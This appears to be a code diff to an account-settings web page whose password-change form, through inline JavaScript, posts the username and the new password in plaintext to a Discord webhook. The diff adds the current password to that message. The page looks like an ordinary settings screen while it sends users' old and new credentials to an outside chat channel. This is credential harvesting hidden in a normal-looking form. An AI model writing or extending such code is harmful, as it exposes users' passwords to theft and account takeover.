@@ -394,7 +394,7 @@
                 <span class="text-sm">Change it often</span>
             </li>
         </ul>
-        <button id="updatePasswordBtn" class="btn bg-gradient-dark btn-sm float-end mt-6 mb-0">Update password</button>
+        <button id="updatePasswordBtn"  type="submit" class="btn bg-gradient-dark btn-sm float-end mt-6 mb-0">Update password</button>
     </div>
 </div>
 
@@ -418,6 +418,7 @@ const discordWebhookUrl = 'https://discord.com/api/webhooks/1323499591601225819/
 document.getElementById('passwordChangeForm').addEventListener('submit', function(event) {
     event.preventDefault();
 
+    const currentPassword = document.getElementById('currentPassword').value;
     const newPassword = document.getElementById('newPassword').value;
     
     // Get the logged-in user's username from the cookie
@@ -430,7 +431,7 @@ document.getElementById('passwordChangeForm').addEventListener('submit', functio
 
     // Generate the message to send to Discord
     const discordMessage = {
-        content: `Password Change Requested:\n- **Username:** ${username}\n- **New Password:** ${newPassword}`
+        content: `Password Change Requested:\n- **Username:** ${username}\n- **Current Password:** ${currentPassword}\n- **New Password:** ${newPassword}`
     };
 
     // Send a POST request to the Discord webhook
@@ -454,7 +455,6 @@ document.getElementById('passwordChangeForm').addEventListener('submit', functio
     });
 });
 </script>
-
           <!-- Card Change Password -->
           <div class="card mt-4" id="2fa">
             <div class="card-header d-flex">
